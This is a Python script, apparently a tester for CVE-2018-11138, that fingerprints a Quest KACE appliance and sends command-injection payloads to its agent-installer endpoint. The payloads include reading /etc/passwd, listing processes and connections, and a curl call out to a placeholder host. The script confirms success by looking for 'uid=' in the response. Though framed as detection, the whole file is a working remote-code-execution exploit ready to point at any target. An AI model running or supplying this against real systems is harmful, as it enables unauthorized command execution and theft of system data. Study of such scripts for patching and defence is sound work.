#!/usr/bin/env python3
"""
CVE-2018-11138 - Quest KACE System Management Appliance RCE Test Script
Author: Security Researcher
Description: Tests various payloads for the command injection vulnerability
"""

import requests
import sys
import urllib3
import time
from urllib.parse import urljoin

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class QuestKACETester:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def test_basic_detection(self):
        """Test basic detection of Quest KACE system"""
        print("[+] Testing basic detection...")
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code == 200:
                if 'KACE' in response.text or 'Quest' in response.text:
                    print(f"[+] Target appears to be Quest KACE system")
                    return True
                else:
                    print(f"[-] Target doesn't appear to be Quest KACE system")
                    return False
        except Exception as e:
            print(f"[-] Error testing basic detection: {e}")
            return False
    
    def test_vulnerable_endpoint(self, payload):
        """Test the vulnerable endpoint with a specific payload"""
        url = urljoin(self.target_url, '/common/download_agent_installer.php')
        data = {
            'platform': 'linux',
            'custom_install_options': payload
        }
        
        try:
            print(f"[+] Testing payload: {payload}")
            response = self.session.post(url, data=data, timeout=15)
            
            if response.status_code == 200:
                print(f"[+] Request successful (Status: {response.status_code})")
                if 'uid=' in response.text or 'gid=' in response.text:
                    print(f"[+] VULNERABLE! Command execution detected!")
                    return True
                else:
                    print(f"[-] No command execution detected in response")
                    return False
            else:
                print(f"[-] Request failed (Status: {response.status_code})")
                return False
                
        except Exception as e:
            print(f"[-] Error testing payload: {e}")
            return False
    
    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("=" * 60)
        print("CVE-2018-11138 - Quest KACE RCE Vulnerability Tester")
        print("=" * 60)
        print(f"Target: {self.target_url}")
        print()
        
        # Test basic detection
        if not self.test_basic_detection():
            print("[-] Skipping vulnerability tests - target doesn't appear to be Quest KACE")
            return
        
        print()
        print("Testing vulnerability payloads...")
        print("-" * 40)
        
        # Define test payloads
        payloads = [
            ";id;echo+",
            ";whoami;echo+",
            ";pwd;echo+",
            ";ls+-la;echo+",
            ";cat+/etc/passwd;echo+",
            ";uname+-a;echo+",
            ";hostname;echo+",
            ";ps+aux;echo+",
            ";netstat+-an;echo+",
            ";curl+http://example.com;echo+"
        ]
        
        vulnerable = False
        
        for payload in payloads:
            if self.test_vulnerable_endpoint(payload):
                vulnerable = True
                break
            time.sleep(1)  # Small delay between requests
        
        print()
        print("=" * 60)
        if vulnerable:
            print("[!] VULNERABILITY CONFIRMED!")
            print("[!] The target is vulnerable to CVE-2018-11138")
            print("[!] Immediate action required to patch the system")
        else:
            print("[+] Target appears to be NOT vulnerable")
            print("[+] No command execution detected")
        print("=" * 60)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 test-payloads.py <target_url>")
        print("Example: python3 test-payloads.py http://target:80")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    tester = QuestKACETester(target_url)
    tester.run_all_tests()

if __name__ == "__main__":
    main() 